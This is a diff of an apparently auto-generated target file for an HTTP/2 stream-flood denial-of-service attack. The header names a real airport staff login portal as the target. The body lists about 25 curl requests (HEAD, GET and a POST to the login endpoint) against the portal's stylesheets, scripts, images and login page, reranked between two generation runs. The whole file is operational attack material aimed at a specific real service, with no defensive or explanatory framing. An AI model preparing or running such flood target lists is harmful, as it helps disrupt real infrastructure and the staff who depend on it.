@@ -2,106 +2,43 @@
 # Target: https://staffportal.airportthai.co.th/fo/account/login
 # Hostname: staffportal.airportthai.co.th
 # Attack Method: http2-stream-flood
-# Generated: 2025-12-13T21:34:40+07:00
-# Total valid endpoints: 36
+# Generated: 2025-12-16T00:36:24+07:00
+# Total valid endpoints (after ranking/limits): 25
 
 curl \
   -X \
   HEAD \
-  'https://staffportal.airportthai.co.th/fo/images/login/login-name.svg' \
-  -H \
-  'Content-Type: image/svg+xml' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  -X \
-  HEAD \
-  'https://staffportal.airportthai.co.th/fo/resources/FileResource.js' \
-  -H \
-  'Content-Type: application/javascript' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  -X \
-  HEAD \
-  'https://staffportal.airportthai.co.th/fo/images/login/login-logo.svg' \
-  -H \
-  'Content-Type: image/svg+xml' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  'https://staffportal.airportthai.co.th/fo/images/login/login-logo.svg' \
-  -H \
-  'Content-Type: image/svg+xml' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  -X \
-  HEAD \
-  'https://staffportal.airportthai.co.th/fo/fonts/NotoSans/noto_sans_thai.css' \
+  'https://staffportal.airportthai.co.th/fo/lib/bootstrap-icons/font/bootstrap-icons.css' \
   -H \
   'Content-Type: text/css' \
   -H \
   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 
 curl \
-  -X \
-  HEAD \
-  'https://staffportal.airportthai.co.th/fo/lib/bootstrap/css/bootstrap.min.css' \
+  'https://staffportal.airportthai.co.th/fo/lib/bootstrap-icons/font/bootstrap-icons.css' \
   -H \
   'Content-Type: text/css' \
   -H \
   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 
 curl \
-  'https://staffportal.airportthai.co.th/fo/images/login/login-name-as.svg' \
+  'https://staffportal.airportthai.co.th/fo/themes/front/css/theme.min.css?v=1.0' \
+  -H \
+  'Content-Type: text/css' \
+  -H \
+  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+
+curl \
+  'https://staffportal.airportthai.co.th/fo/images/login/login-name-ws.svg' \
   -H \
   'Content-Type: image/svg+xml' \
   -H \
   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 
 curl \
-  'https://staffportal.airportthai.co.th/fo/resources/FileResource.js' \
-  -H \
-  'Content-Type: application/javascript' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  -X \
-  HEAD \
-  'https://staffportal.airportthai.co.th/fo/themes/front/js/hs.theme-appearance.js' \
-  -H \
-  'Content-Type: application/javascript' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  'https://staffportal.airportthai.co.th/fo/css/cookie.css' \
-  -H \
-  'Content-Type: text/css' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  -X \
-  HEAD \
   'https://staffportal.airportthai.co.th/fo/css/theme-custom.css?v=wk2y8E8K4xzmH0ZgcFI9p-2ZR5FSnfZpY50QZ6KPjog' \
   -H \
   'Content-Type: text/css' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  -X \
-  HEAD \
-  'https://staffportal.airportthai.co.th/fo/lib/jquery/jquery.min.js' \
-  -H \
-  'Content-Type: application/javascript' \
   -H \
   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 
@@ -117,16 +54,21 @@ curl \
 curl \
   -X \
   HEAD \
-  'https://staffportal.airportthai.co.th/fo/images/logo-microsoft-azure.svg' \
+  'https://staffportal.airportthai.co.th/fo/resources/FileResource.js' \
+  -H \
+  'Content-Type: application/javascript' \
+  -H \
+  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+
+curl \
+  'https://staffportal.airportthai.co.th/fo/images/login/login-logo.svg' \
   -H \
   'Content-Type: image/svg+xml' \
   -H \
   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 
 curl \
-  -X \
-  HEAD \
-  'https://staffportal.airportthai.co.th/fo/js/cookie.js' \
+  'https://staffportal.airportthai.co.th/fo/lib/bootstrap/js/bootstrap.bundle.min.js' \
   -H \
   'Content-Type: application/javascript' \
   -H \
@@ -135,99 +77,14 @@ curl \
 curl \
   -X \
   HEAD \
-  'https://staffportal.airportthai.co.th/fo/lib/bootstrap-icons/font/bootstrap-icons.css' \
-  -H \
-  'Content-Type: text/css' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  -X \
-  HEAD \
-  'https://staffportal.airportthai.co.th/fo/themes/front/css/theme-dark.min.css' \
-  -H \
-  'Content-Type: text/css' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  'https://staffportal.airportthai.co.th/fo/css/theme-custom.css?v=wk2y8E8K4xzmH0ZgcFI9p-2ZR5FSnfZpY50QZ6KPjog' \
-  -H \
-  'Content-Type: text/css' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  'https://staffportal.airportthai.co.th/fo/images/login/login-name.svg' \
+  'https://staffportal.airportthai.co.th/fo/images/login/login-logo.svg' \
   -H \
   'Content-Type: image/svg+xml' \
   -H \
   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 
 curl \
-  -X \
-  HEAD \
-  'https://staffportal.airportthai.co.th/fo/images/login/login-name-as.svg' \
-  -H \
-  'Content-Type: image/svg+xml' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  -X \
-  HEAD \
-  'https://staffportal.airportthai.co.th/fo/themes/front/css/theme.min.css?v=1.0' \
-  -H \
-  'Content-Type: text/css' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  'https://staffportal.airportthai.co.th/fo/js/cookie.js' \
-  -H \
-  'Content-Type: application/javascript' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  'https://staffportal.airportthai.co.th/fo/fonts/NotoSans/noto_sans_thai.css' \
-  -H \
-  'Content-Type: text/css' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  -X \
-  HEAD \
-  'https://staffportal.airportthai.co.th/fo/css/cookie.css' \
-  -H \
-  'Content-Type: text/css' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  'https://staffportal.airportthai.co.th/fo/images/logo-microsoft-azure.svg' \
-  -H \
-  'Content-Type: image/svg+xml' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  'https://staffportal.airportthai.co.th/fo/images/login/login-name-ws.svg' \
-  -H \
-  'Content-Type: image/svg+xml' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  'https://staffportal.airportthai.co.th/fo/lib/bootstrap/css/bootstrap.min.css' \
-  -H \
-  'Content-Type: text/css' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  'https://staffportal.airportthai.co.th/fo/themes/front/js/hs.theme-appearance.js' \
+  'https://staffportal.airportthai.co.th/fo/resources/FileResource.js' \
   -H \
   'Content-Type: application/javascript' \
   -H \
@@ -252,9 +109,68 @@ curl \
   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 
 curl \
-  'https://staffportal.airportthai.co.th/fo/lib/bootstrap/js/bootstrap.bundle.min.js' \
+  'https://staffportal.airportthai.co.th/fo/themes/front/css/theme-dark.min.css' \
+  -H \
+  'Content-Type: text/css' \
+  -H \
+  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+
+curl \
+  'https://staffportal.airportthai.co.th/fo/js/cookie.js' \
   -H \
   'Content-Type: application/javascript' \
+  -H \
+  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+
+curl \
+  -X \
+  HEAD \
+  'https://staffportal.airportthai.co.th/fo/lib/bootstrap/css/bootstrap.min.css' \
+  -H \
+  'Content-Type: text/css' \
+  -H \
+  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+
+curl \
+  -X \
+  HEAD \
+  'https://staffportal.airportthai.co.th/fo/lib/jquery/jquery.min.js' \
+  -H \
+  'Content-Type: application/javascript' \
+  -H \
+  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+
+curl \
+  -X \
+  HEAD \
+  'https://staffportal.airportthai.co.th/fo/themes/front/css/theme.min.css?v=1.0' \
+  -H \
+  'Content-Type: text/css' \
+  -H \
+  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+
+curl \
+  'https://staffportal.airportthai.co.th/fo/account/login' \
+  -H \
+  'Content-Type: text/html; charset=utf-8' \
+  -H \
+  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+
+curl \
+  -X \
+  POST \
+  'https://staffportal.airportthai.co.th/fo/account/login' \
+  -H \
+  'Content-Type: application/json; charset=utf-8' \
+  -H \
+  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' \
+  -d \
+  'data=test'
+
+curl \
+  'https://staffportal.airportthai.co.th/fo/images/login/login-name-as.svg' \
+  -H \
+  'Content-Type: image/svg+xml' \
   -H \
   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 
@@ -266,30 +182,25 @@ curl \
   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 
 curl \
-  'https://staffportal.airportthai.co.th/fo/themes/front/css/theme-dark.min.css' \
+  -X \
+  HEAD \
+  'https://staffportal.airportthai.co.th/fo/images/login/login-name.svg' \
   -H \
-  'Content-Type: text/css' \
-  -H \
-  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-
-curl \
-  'https://staffportal.airportthai.co.th/fo/lib/bootstrap-icons/font/bootstrap-icons.css' \
-  -H \
-  'Content-Type: text/css' \
+  'Content-Type: image/svg+xml' \
   -H \
   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 
 curl \
-  'https://staffportal.airportthai.co.th/fo/themes/front/css/theme.min.css?v=1.0' \
+  'https://staffportal.airportthai.co.th/fo/images/login/login-name.svg' \
   -H \
-  'Content-Type: text/css' \
+  'Content-Type: image/svg+xml' \
   -H \
   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 
 curl \
-  'https://staffportal.airportthai.co.th/fo/themes/front/css/theme.min.css' \
+  'https://staffportal.airportthai.co.th/fo/themes/front/js/hs.theme-appearance.js' \
   -H \
-  'Content-Type: text/css' \
+  'Content-Type: application/javascript' \
   -H \
   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 
